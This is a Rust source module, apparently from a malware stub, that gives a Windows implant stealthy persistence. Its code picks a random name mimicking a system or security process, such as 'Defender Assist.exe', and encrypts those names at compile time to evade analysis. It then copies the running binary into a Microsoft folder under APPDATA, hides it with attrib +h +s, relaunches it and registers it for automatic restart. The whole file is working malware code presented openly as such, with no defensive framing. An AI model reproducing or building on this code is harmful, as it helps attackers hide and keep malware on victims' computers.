use std::env;
use std::fs;
use std::path::PathBuf;
use std::process::Command;
use std::sync::OnceLock;
use rand::RngExt;
use rust_code_obfuscator::obfuscate_string;
use zeroize::Zeroize;
use crate::StubError;

/// Innocent-looking system names, encrypted at compile time by
/// `rust_code_obfuscator`. The plaintext never appears in the binary.
fn all_names() -> Vec<String> {
    vec![
        obfuscate_string!("Local Permission Handler.exe").to_string(),
        obfuscate_string!("PE Protector.exe").to_string(),
        obfuscate_string!("Security Assistants.exe").to_string(),
        obfuscate_string!("Windows Security Health.exe").to_string(),
        obfuscate_string!("System Permission Service.exe").to_string(),
        obfuscate_string!("Defender Assist.exe").to_string(),
        obfuscate_string!("Runtime Broker.exe").to_string(),
        obfuscate_string!("Background Task Host.exe").to_string(),
    ]
}

/// Pick a random name once per process and cache it.
/// `target_path()` is called from both `is_running_from_target()` and
/// `install_and_launch()`; both must agree on the same name or the
/// copy-loop guard breaks.
fn masquerade_name() -> &'static str {
    static NAME: OnceLock<String> = OnceLock::new();
    NAME.get_or_init(|| {
        let mut names = all_names(); // Vec<String>
        let idx = rand::rng().random_range(0..names.len());
        let picked = names.swap_remove(idx); // Take out the target name

        // Erase the remaining unused names and the emptied slots
        for s in names.iter_mut() {
            s.zeroize(); // Clear the String content still in the Vec
        }
        names.zeroize(); // Clear the Vec's own buffer (if it contains remaining data)

        picked
    })
}

/// Returns the path where the persistent copy should live.
pub fn target_path() -> Option<PathBuf> {
    let appdata = env::var("APPDATA").ok()?;
    Some(
        PathBuf::from(appdata)
            .join("Microsoft")
            .join("Windows")
            .join(masquerade_name()),
    )
}

/// Returns true if the current process is already running from the
/// persistent location.
pub fn is_running_from_target() -> bool {
    let current = match env::current_exe() {
        Ok(p) => p,
        Err(_) => return false,
    };
    let target = match target_path() {
        Some(p) => p,
        None => return false,
    };
    let current = fs::canonicalize(&current).unwrap_or(current);
    let target = fs::canonicalize(&target).unwrap_or(target);
    current == target
}

/// Copy the running stub to the persistent location and launch it.
pub fn install_and_launch() -> Result<(), StubError> {
    let current = env::current_exe().map_err(|_| StubError::PersistenceFailed)?;
    let target = target_path().ok_or(StubError::PersistenceFailed)?;

    if let Some(parent) = target.parent() {
        fs::create_dir_all(parent).map_err(|_| StubError::PersistenceFailed)?;
    }

    fs::copy(&current, &target).map_err(|_| StubError::PersistenceFailed)?;

    let _ = Command::new("attrib")
        .args(["+h", "+s"])
        .arg(&target)
        .status();

    Command::new(&target)
        .spawn()
        .map_err(|_| StubError::PersistenceFailed)?;

    Ok(())
}

/// Register the current process (which is the copy) for Phantom Persistence.
pub fn register_persistence() {
    phantom_persist_rs::register_application_restart();
    std::thread::spawn(|| {
        phantom_persist_rs::message_loop_thread();
    });
}